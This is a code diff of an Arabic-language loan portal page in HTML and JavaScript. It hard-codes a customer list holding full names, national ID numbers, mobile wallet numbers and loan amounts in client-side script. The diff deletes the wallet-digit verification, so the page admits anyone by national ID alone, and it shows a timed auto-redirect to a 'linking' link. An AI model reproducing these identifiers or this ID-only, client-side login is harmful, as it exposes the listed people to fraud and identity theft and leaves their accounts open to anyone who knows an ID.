@@ -644,7 +644,6 @@
                 <strong>حالة الطلب</strong>
                 <span id="statusMsg">مطلوب إتمام الربط</span>
             </div>
-            <!-- معلومات القسط والمدة الجديدة -->
             <div class="info-card">
                 <i class="fas fa-calendar-alt"></i>
                 <strong>القسط الشهري</strong>
@@ -678,7 +677,6 @@
         </div>
 
         <div id="linkingSection" class="linking-section">
-            <!-- صندوق التوجيه التلقائي -->
             <div id="autoRedirectBox" class="auto-redirect-box" style="display: none;">
                 <span><i class="fas fa-hourglass-half"></i> سيتم توجيهك إلى رابط الربط تلقائياً بعد</span>
                 <span class="timer-number" id="redirectSeconds">30</span>
@@ -725,7 +723,7 @@
 </div>
 
 <script>
-    // ========== جدول الأقساط والمدة (نفس الجدول المستخدم في الكود الثالث) ==========
+    // ========== جدول الأقساط والمدة ==========
     const loanDetailsMap = {
         30000: { months: 12, installment: 3325 },
         35000: { months: 12, installment: 3875 },
@@ -767,7 +765,6 @@
     function getLoanDetails(amount) {
         const exact = loanDetailsMap[amount];
         if (exact) return exact;
-        // إذا لم يوجد، نبحث عن أقرب مبلغ موجود (تقريب)
         const keys = Object.keys(loanDetailsMap).map(Number).sort((a,b)=>a-b);
         let closest = keys[0];
         for (let k of keys) {
@@ -776,7 +773,7 @@
         return loanDetailsMap[closest] || { months: 12, installment: 0 };
     }
 
-    // قاعدة العملاء (جميع العملاء السابقين + الجدد)
+    // ========== قاعدة العملاء (بدون طلب آخر 4 أرقام) ==========
     const customers = [
         { name: "احمد ماهر احمد محمد ", id: "28309122103052", wallet: "01032201208", type: "فودافون", loan: 100000, step: 22500 },
         { name: "معاذ السيد الغريب أحمد", id: "28205031201019", wallet: "01033830731", type: "فودافون", loan: 200000, step: 50000 },
@@ -784,7 +781,6 @@
         { name: "علاء عبدالحكيم محمد درويش", id: "29410011617371", wallet: "01027250679", type: "فودافون", loan: 40000, step: 10000 },
         { name: "محمد ابوالسعود محمود ابوالحسن", id: "29109182702197", wallet: null, type: null, loan: 50000, step: 12500 },
         { name: "مصطفى نبيل فوزي محمود", id: "28612061701011", wallet: "01122540100", type: "اتصالات", loan: 50000, step: 12500 },
-        { name: "وحيد محمد عارف عبد الله", id: "28309072600611", wallet: "01017453927", type: "فودافون", loan: 100000, step: 22500 },
         { name: "احمد محمد احمد ابو سيد", id: "27601272100298", wallet: "01000013172", type: "فودافون", loan: 200000, step: 50000 },
         { name: "حماده السيد السعيد حبيش", id: "28606171602191", wallet: "01014327407", type: "فودافون", loan: 100000, step: 25000 },
         { name: "حماده ابوالعلا عبد العظيم ابوالعلا", id: "29102272500939", wallet: "01092974641", type: "فودافون", loan: 30000, step: 7500 },
@@ -802,11 +798,11 @@
         { name: "صلاح مختار حنفي قرني", id: "27708040101271", wallet: "01023669498", type: "فودافون", loan: 50000, step: 12500 },
         { name: "السيد ابراهيم الششتاوي قناوي ", id: "26803241601893", wallet: "01090232423", type: "فودافون", loan: 30000, step: 7500 },
         { name: "محمود علي المتولي السيد حسن", id: "28404071200379", wallet: "01001093695", type: "فودافون", loan: 30000, step: 7500 },
-        { name: "وحيد محمد عارف عبد الله", id: "28309072600611", wallet: "01017453927", type: "فودافون", loan: 200000, step: 50000 },
+        { name: "وحيد محمد عارف عبد الله", id: "283090600611", wallet: "01017453927", type: "فودافون", loan: 200000, step: 50000 },
         { name: "مدحت محمد محمود سالم ", id: "27910252801039", wallet: "01159760178", type: "اتصالات", loan: 50000, step: 12500 },
         { name: "الشيماء عبد الغفور دسوقي عباس", id: "282072102361", wallet: "01143455214", type: "اتصالات", loan: 150000, step: 37500 },
         { name: "رفيق فؤاد عبد الفضيل يوسف", id: "27512311400919", wallet: "01014337192", type: "فودافون", loan: 190000, step: 47500 },
-        { name: "هشام أحمد صلاح محمد عبدالغغار", id: "271011414511", wallet: "01022560232", type: "فودافون", loan: 50000, step: 12500 },
+        { name: "هشام أحمد صلاح محمد عبدالغغار", id: "2711414511", wallet: "01022560232", type: "فودافون", loan: 50000, step: 12500 },
         { name: "محمد محمود عبد الحميد محمد", id: "283101901335", wallet: "01026479629", type: "فودافون", loan: 40000, step: 10000 },
         { name: "ياسر سعد محمد بكر", id: "275073200599", wallet: "01226157120", type: "فودافون", loan: 60000, step: 15000 },
         { name: "حسين صبرى مصطفى حسن", id: "28909012110875", wallet: "01142032336", type: "اتصالات", loan: 100000, step: 25000 },
@@ -883,20 +879,7 @@
             return;
         }
         
-        // طلب آخر 4 أرقام من المحفظة (إذا كانت موجودة)
-        if (customer.type && customer.wallet) {
-            const last4Digits = prompt('🔐 لأغراض التأمين، يرجى إدخال آخر 4 أرقام من رقم محفظتك المسجلة:');
-            if (!last4Digits || last4Digits.length !== 4) {
-                errorDiv.textContent = 'يجب إدخال آخر 4 أرقام بشكل صحيح.';
-                return;
-            }
-            const walletLast4 = customer.wallet.slice(-4);
-            if (last4Digits !== walletLast4) {
-                errorDiv.textContent = '❌ الأرقام غير صحيحة. يرجى المحاولة مرة أخرى.';
-                return;
-            }
-        }
-        
+        // تم إزالة طلب آخر 4 أرقام من المحفظة - الدخول مباشرة بالرقم القومي فقط
         currentCustomer = customer;
         errorDiv.textContent = '';
         document.getElementById('loginPage').style.display = 'none';
@@ -916,13 +899,12 @@
         document.getElementById('walletType').innerText = walletDisplay;
         document.getElementById('walletNumber').innerText = walletNumberDisplay;
 
-        // عرض معلومات القسط والمدة وموعد أول قسط
         const details = getLoanDetails(customer.loan);
         const installment = details.installment;
         const months = details.months;
         const today = new Date();
         const firstPaymentDate = new Date();
-        firstPaymentDate.setDate(today.getDate() + 29); // بعد 29 يوم من اليوم
+        firstPaymentDate.setDate(today.getDate() + 29);
         const formattedDate = firstPaymentDate.toLocaleDateString('ar-EG', { year: 'numeric', month: 'long', day: 'numeric' });
         
         document.getElementById('monthlyInstallment').innerHTML = installment.toLocaleString() + ' ج.م';
